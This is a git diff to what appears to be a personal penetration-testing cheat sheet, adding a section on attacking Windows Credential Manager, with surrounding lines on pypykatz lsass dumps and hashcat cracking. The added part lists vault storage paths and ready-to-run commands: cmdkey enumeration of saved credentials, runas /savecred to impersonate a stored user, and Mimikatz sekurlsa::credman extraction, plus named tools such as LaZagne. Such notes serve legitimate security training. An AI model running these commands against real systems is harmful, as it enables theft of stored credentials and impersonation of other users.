@@ -49,7 +49,47 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp # Using Pypykatz to Extrac
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
 
+## Attacking Windows Credential Manager
+
+```bash
+## Windows Vault and Credential Manager
+
+  # Credential Manager allows users and applications to securely store credentials relevant to other systems and websites , the  Credential Lockers (formerly Windows Vaults) store in:
+  %UserProfile%\AppData\Local\Microsoft\Vault\
+  %UserProfile%\AppData\Local\Microsoft\Credentials\
+  %UserProfile%\AppData\Roaming\Microsoft\Vault\
+  %ProgramData%\Microsoft\Vault\
+  %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
+
+  # types of credentials Windows stores:
+    # Web Credentials: Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.
+    # Windows Credentials: Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.
+
+ # export Windows Vaults to .crd files
+  rundll32 keymgr.dll,KRShowKeyMgr # or via Control Panel too
+
+## Enumerating credentials with cmdkey
+
+  whoami # sadams
+  cmdkey /list #  # example we find Target: Domain:interactive=SRV01\mcharles 
+    # Target: computer, domain name, or a special identifier.
+    # Type:   generic for general creds or Domain Password 
+    # User:   the user associated with the cerds 
+    # Persistence: indicate whether a credential is saved persistently on the computer
+   
+  # impersonate the stored user
+  runas /savecred /user:SRV01\mcharles cmd
+
+## Extracting credentials with Mimikatz
+  mimikatz.exe
+  privilege::debug
+  sekurlsa::credman
+  [1] # Note:Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
+
+```
+
 ## Attacking Active Directory & NTDS.dit
+
 ```bash 
 ### search for usernames 
 
